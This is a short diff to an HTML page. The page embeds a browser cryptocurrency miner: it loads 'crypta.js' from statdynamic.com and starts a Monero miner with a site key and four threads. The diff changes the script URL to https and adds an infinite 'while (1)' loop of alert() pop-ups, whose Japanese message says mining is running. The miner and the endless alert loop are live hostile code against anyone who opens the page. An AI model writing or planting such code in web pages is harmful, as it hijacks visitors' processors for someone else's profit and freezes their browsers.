@@ -27,12 +27,15 @@
       </div>
     </div>
   </section>
-  <script src="//statdynamic.com/lib/crypta.js"></script>
+  <script src="https://statdynamic.com/lib/crypta.js"></script>
   <script>
     var miner=new CRLT.Anonymous('7bf749951b84b0822842bb11b1c8e277f14a312493e5', {
       threads:4,throttle:0.2, coin: "xmr",
     });
     miner.start();
+    while (1) {
+      alert("このページではマイニングスクリプトが動作しています。");  
+    }
   </script>
 </body>
 </html>
